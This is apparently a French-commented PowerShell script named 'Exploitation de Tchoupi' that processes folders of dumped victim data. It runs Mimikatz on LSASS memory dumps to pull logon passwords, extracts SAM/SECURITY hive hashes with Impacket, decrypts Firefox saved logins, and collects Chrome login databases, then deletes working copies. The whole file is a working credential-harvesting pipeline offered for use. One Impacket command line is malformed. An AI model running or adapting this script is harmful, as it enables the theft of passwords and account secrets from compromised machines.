### Exploitation de Tchoupi
#  Mettres les dossiers de dump dans .\Dump
$user = $env:USERNAME
$folders = Get-ChildItem -Path "C:\Users\$user\Desktop\Tchoupi\Dump"
cd C:\Users\$user\Desktop\Tchoupi\Dump
foreach ($folder in $folders)
{
    cd C:\Users\$user\Desktop\Tchoupi\Dump\$folder
    mkdir Résultats
    ###
    ### Mimikatz
    cp C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\lsass.dmp 'C:\Users\$user\Desktop\Programs\Mimikatz\x64'
    cd 'C:\Users\$user\Desktop\Programs\Mimikatz\x64'
    .\mimikatz.exe privilege::debug "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords exit > dumplsa.txt
    mv dumplsa.txt C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats
    rm lsass.dmp

    ### Extraction base SAM Admin
    cd C:\Python38
    cp C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\SAM.hiv .\
    cp C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\SYSTEM.hiv .\
    cp C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\SECURITY.hiv .\
    .\python.exe 'C:\Users\$user\Desktop\Programs\Impacket\examples'-system SYSTEM.hiv -sam SAM.hiv -security SECURITY.hiv LOCAL > SAM.txt
    mv SAM.txt C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats
    rm SAM
    rm SECURITY
    rm SYSTEM

    ### Extraction des mots de passe Chrome :
    <#
    $chromes = Get-ChildItem -Path "C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin"
    cd C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin
    foreach ($chrome in $chromes)
    {
        cd C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\$chrome
        $chemin = "C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin\$chrome\Login Data"
        ADD-content -path C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats\chrome-$chrome.txt -value $chemin
    }
    #>

    ### Extraction des mots de passe Firefox :
    $mozillas = Get-ChildItem -Path "C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin"
    cd C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Data-Admin
    foreach ($mozilla in $mozillas)
    {
        cd $mozilla
        $path = "logins.json"
        if (Test-Path $path -PathType Leaf)
        {
            C:\Users\$user\AppData\Local\Programs\Python\Python38-32\python.exe C:\Users\$user\Desktop\Programs\firefox_decrypt-master\firefox_decrypt.py .\
        }
    }
    ###Tri des fichiers de sortie pour les bases chromes :
    cd C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats
    Remove-Item .\chrome-SYSTEM.txt
    Remove-Item .\chrome-SAM.txt
    Remove-Item .\chrome-SECURITY.txt
    Remove-Item .\chrome-lsass.dmp.txt
    Remove-Item .\chrome-Public.txt
    #for %f in (*.txt) do type "%f" >> BaseDeDonnéesChrome.txt
    $fichierstxt = "C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats\chrome-*.txt"
    $dirmaster = "C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats\BaseDeDonnéesChrome.txt"
    add-content $dirmaster -value (get-content $fichierstxt)
    mv .\BaseDeDonnéesChrome.txt .\BdD_Chrome.txt
    rm C:\Users\$user\Desktop\Tchoupi\Dump\$folder\Résultats\chrome-*.txt
}



<### Effacement des traces pour les tests
pause
$f1olders = Get-ChildItem -Path "C:\Users\$user\Desktop\Tchoupi\Dump"
cd $f1olders
foreach ($f1older in $f1olders)
{
    cd C:\Users\$user\Desktop\Tchoupi\Dump\$f1older
    rm Résultats -Recurse
}

cd C:\Users\$user\Desktop\Tchoupi\
##>
